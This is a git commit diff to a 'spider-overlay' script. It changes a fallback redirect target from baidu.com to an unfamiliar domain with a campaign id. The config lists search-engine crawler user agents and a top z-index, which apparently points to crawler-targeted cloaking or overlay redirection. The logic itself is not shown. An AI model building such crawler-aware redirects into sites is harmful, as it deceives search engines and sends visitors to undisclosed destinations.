2d37322da9559338da3a76ad22343231214a66bb
mkallec <mkallec@github.com>
2026-06-28 07:44:38 +0800

    同步兜底地址

--- spider-overlay-v2/netlify/spider-overlay.js
+++ spider-overlay-v2/netlify/spider-overlay.js
@@ -14,7 +14,7 @@
   'use strict';
 
   var FALLBACK_CONFIG = {
-    targetUrl: 'https://www.baidu.com',
+    targetUrl: 'https://dh-hzh5.hbaissa.cn?cid=1034',
     enabled: true,
     spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
     zIndex: 9999,
